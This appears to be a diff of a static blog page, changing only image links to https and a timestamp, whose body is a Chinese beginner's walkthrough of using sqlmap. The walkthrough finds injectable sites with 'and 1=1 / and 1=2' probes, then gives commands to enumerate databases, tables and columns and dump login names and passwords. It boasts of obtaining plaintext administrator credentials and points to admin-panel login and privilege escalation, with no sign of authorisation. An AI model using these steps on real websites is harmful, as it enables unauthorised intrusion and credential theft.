@@ -21,17 +21,17 @@
 <meta property="og:url" content="http://huirong.github.io/2014/09/02/第一次使用sqlmap/index.html">
 <meta property="og:site_name" content="Star">
 <meta property="og:description" content="本人菜鸟一枚，第一次使用sqlmap，大神误入准备工作：使用 ‘  and 1=1  and 1=2 找到可能存在sql注入的网站">
-<meta property="og:image" content="http://img.blog.csdn.net/20140902162816652">
-<meta property="og:image" content="http://img.blog.csdn.net/20140902163603858">
-<meta property="og:image" content="http://img.blog.csdn.net/20140902163959578">
-<meta property="og:image" content="http://img.blog.csdn.net/20140902164217546">
-<meta property="og:image" content="http://img.blog.csdn.net/20140902165805211">
-<meta property="og:image" content="http://img.blog.csdn.net/20140902172455071">
-<meta property="og:updated_time" content="2016-09-07T08:13:37.029Z">
+<meta property="og:image" content="https://img.blog.csdn.net/20140902162816652">
+<meta property="og:image" content="https://img.blog.csdn.net/20140902163603858">
+<meta property="og:image" content="https://img.blog.csdn.net/20140902163959578">
+<meta property="og:image" content="https://img.blog.csdn.net/20140902164217546">
+<meta property="og:image" content="https://img.blog.csdn.net/20140902165805211">
+<meta property="og:image" content="https://img.blog.csdn.net/20140902172455071">
+<meta property="og:updated_time" content="2017-02-19T10:37:48.604Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="第一次使用 sqlmap">
 <meta name="twitter:description" content="本人菜鸟一枚，第一次使用sqlmap，大神误入准备工作：使用 ‘  and 1=1  and 1=2 找到可能存在sql注入的网站">
-<meta name="twitter:image" content="http://img.blog.csdn.net/20140902162816652">
+<meta name="twitter:image" content="https://img.blog.csdn.net/20140902162816652">
 
   
 
@@ -189,19 +189,19 @@
       <p>本人菜鸟一枚，第一次使用sqlmap，大神误入<br>准备工作：使用 ‘  and 1=1  and 1=2 找到可能存在sql注入的网站<br><a id="more"></a></p>
 <h1 id="I、查看数据库系统信息"><a href="#I、查看数据库系统信息" class="headerlink" title="I、查看数据库系统信息"></a>I、查看数据库系统信息</h1><p>在终端输入<br><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">sqlmap</span> <span class="literal">-</span><span class="comment">u</span> <span class="comment">url</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">dbs</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">current</span><span class="literal">-</span><span class="comment">user</span></div></pre></td></tr></table></figure></p>
 <p>说明：url 换成你之前找到的可能存在sql注入的网址 ，文中的url都是这样，不在赘述</p>
-<p><img src="http://img.blog.csdn.net/20140902162816652" alt=""></p>
+<p><img src="https://img.blog.csdn.net/20140902162816652" alt=""></p>
 <h1 id="II、查看数据库表"><a href="#II、查看数据库表" class="headerlink" title="II、查看数据库表"></a>II、查看数据库表</h1><figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u -url <span class="comment">--tables</span></div></pre></td></tr></table></figure>
-<p><img src="http://img.blog.csdn.net/20140902163603858" alt=""></p>
+<p><img src="https://img.blog.csdn.net/20140902163603858" alt=""></p>
 <p>会出现一个错误，询问是否使用常用的表来 查询数据库表，选择 y<br>sqlmap 会加载常用的数据库表命名字典，使用其中的表名执行sql语句，判断数据库中是否存在相应的表名</p>
-<p><img src="http://img.blog.csdn.net/20140902163959578" alt=""></p>
+<p><img src="https://img.blog.csdn.net/20140902163959578" alt=""></p>
 <p>输入运行的线程数，这个数字任意</p>
-<p>期间可能会出现请求超时的情况，不用管，sqlmap会自动再次请求，直接等结果<br><img src="http://img.blog.csdn.net/20140902164217546" alt=""></p>
+<p>期间可能会出现请求超时的情况，不用管，sqlmap会自动再次请求，直接等结果<br><img src="https://img.blog.csdn.net/20140902164217546" alt=""></p>
 <p>查询出两张表，可能数据库中不止这两张表</p>
 <h1 id="III、查看表字段"><a href="#III、查看表字段" class="headerlink" title="III、查看表字段"></a>III、查看表字段</h1><figure class="highlight excel"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u url -<span class="built_in">T</span> uname --<span class="built_in">columns</span></div></pre></td></tr></table></figure>
 <p>说明：uname是上面查询出来的其中一张表</p>
-<p><img src="http://img.blog.csdn.net/20140902165805211" alt=""></p>
+<p><img src="https://img.blog.csdn.net/20140902165805211" alt=""></p>
 <h1 id="IV、查看数据"><a href="#IV、查看数据" class="headerlink" title="IV、查看数据"></a>IV、查看数据</h1><figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u -url -T uname -C login_name,pass,username <span class="comment">--dump</span></div></pre></td></tr></table></figure>
-<p><img src="http://img.blog.csdn.net/20140902172455071" alt=""></p>
+<p><img src="https://img.blog.csdn.net/20140902172455071" alt=""></p>
 <p>发现密码竟然是明文，得到管理员账号和密码了。。。。。。。<br>后续就是找后台地址，登录，然后继续提权，就不介绍了</p>
 
     
